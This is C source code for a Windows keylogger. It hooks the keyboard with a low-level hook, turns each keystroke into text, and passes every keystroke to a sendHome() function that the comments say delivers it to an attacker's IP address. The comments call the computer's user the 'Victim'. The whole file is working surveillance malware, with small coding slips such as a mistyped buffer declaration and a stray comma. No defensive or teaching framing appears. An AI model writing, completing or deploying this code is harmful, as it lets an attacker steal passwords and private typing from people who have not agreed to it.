#include "config.h"

int keylogger()
{
	//Receives message information from the thread's message queue.
	MSG msg;

	//Keyboard is hooked into to be able to detect Victim's keystrokes.
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, 0, 0);
	if (!hook)
	{
		_tprintf(_T("ERROR: keyboardHook has failed."));
		return 1;
	}

	//Hooked keyboard's keystrokes are repeatedly intercepted
	//and sent to the Attacker's designated IP address.
	while (!GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateMessage(&msg))
		{
			_tprintf(_T("ERROR: TranslateMessage has failed."));
			return 1;
		}

		DispatchMessage(&msg);
	}

	//Keyboard is unhooked once you're done listening.
	if (!UnhookWindowsHookEx(hook))
	{
		_tprintf(_T("ERROR: UnhookWindowsHookEx has failed."));
		return 1;
	}

	return 0;
}

LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	//Keyboard key to string mapping
	static char map[][7] =
	{    // 0    -   1    -   2    -   3    -   4    -   5    -   6    -   7    -   8    -   9            Index
		"",      "",      "",      "",      "",      "",      "",      "",      "[BSP]", "\t",	  //   0-9
		"",      "",      "",      "\n",    "",      "",      "",      "",      "",      "[PSE]", //  10-19
		"[CAP]", "",      "",      "",      "",      "",      "",      "[ESC]", "",      "",	  //  20-29
		"",      "",      " ",     "[PUP]", "[PDN]", "[END]", "[HME]", "[LAR]", "[UAR]", "[RAR]", //  30-49
		"[DAR]", "",      "",      "",      "[PSC]", "[INS]", "[DEL]", "",      "0",     "1",	  //  40-49
		"2",     "3",     "4",     "5",     "6",     "7",     "8",     "9",     "",      "",      //  50-59
		"",      "",      "",      "",      "",      "A",     "B",     "C",     "D",     "E",	  //  60-69
		"F",     "G",     "H",     "I",     "J",     "K",     "L",     "M",     "N",     "O",     //  70-79
		"P",     "Q",     "R",     "S",     "T",     "U",     "V",     "W",     "X",     "Y",	  //  80-89
		"Z",     "[LWN]", "[RWN]", "",      "",      "",      "0",     "1",     "2",     "3",     //  90-99
		"4",     "5",     "6",     "7",     "8",     "9",     "*",     "+",     "",      "-",	  // 100-109
		".",     "\\",    "[F1]",  "[F2]",  "[F3]",  "[F4]",  "[F5]",  "[F6]",  "[F7]",  "[F8]",  // 110-119
		"[F9]",  "[F10]", "[F11]", "[F12]", "",      "",      "",      "",      "",      "",	  // 120-129
		"",      "",      "",      "",      "",      "",      "",      "",      "",      "",      // 130-139
		"",      "",      "",      "",      "[NLK]", "[SLK]", "",      "",      "",      "",	  // 140-149
		"",      "",      "",      "",      "",      "",      "",      "",      "",      "",      // 150-159
		"",      "",      "[LCT]", "[RCT]", "[LAL]", "[RAL]", "",      "",      "",      "",	  // 160-169
		"",      "",      "",      "[MTE]", "[VDN]", "[VUP]", "",      "",      "",      "",      // 170-179
		"",      "",      "",      "",      "",      "",      ";",     "=",     ",",     "-",	  // 180-189
		".",     "/",     "`",     "",      "",      "",      "",      "",      "",      "",      // 190-199
		"",      "",      "",      "",      "",      "",      "",      "",      "",      "",	  // 200-209
		"",      "",      "",      "",      "",      "",      "",      "",      "",      "[",     // 210-219
		"\\",    "]",     "'",     "",      "",      "",      "",      "",      ""                // 220-228
	};

	//If shift is pressed then one of
	//these characters will be used.
	static char* shiftMap[] =
	{
		")", "!", "@", "#", "$", "%%", "^",
		"&", "*", "(", ":", "+", "<", "_",
		">", "?", "~", "{", "|", "}", "\""
	};

	//Buffer that holds the value of the incoming key
	char* string[5];

	//If a keyboard press id detected.
	if (nCode == HC_ACTION)
	{
		//If keydown is detected.
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			//Incoming keyboard key value is parsed and mapped to a value defined
			//in the map array. If shift is detected being pressed simultaneously 
			//with another key the value will be pulled from the shift array. 
			PKBDLLHOOKSTRUCT hookStruct = (PKBDLLHOOKSTRUCT)lParam;
			SHORT shift = GetAsyncKeyState(VK_SHIFT);
			int code = hookStruct->vkCode;

			if (!shift && code >= 'A' && code <= 'Z') sprintf_s(string, 5, "%c", code + 32);
			else if (shift && code >= 48 && code <= 57) sprintf_s(string, 5, shiftMap[code - 48]);
			else if (shift && code >= 186 && code <= 192) sprintf_s(string, 5, shiftMap[code - 176]);
			else if (shift && code >= 219 && code <= 222) sprintf_s(string, 5, shiftMap[code - 202]);
			else sprintf_s(string, 5, "%s", map[code]);

			//After the key press is mapped to a value from one of the
			//arrays it is sent to the IP designated by the Attacker.
			if (sendHome(string, 0))
			{
				_tprintf(_T("ERROR: sendHome has failed.", ));
				return 1;
			}
		}
	}

	//Persitently intercept users keystrokes.
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
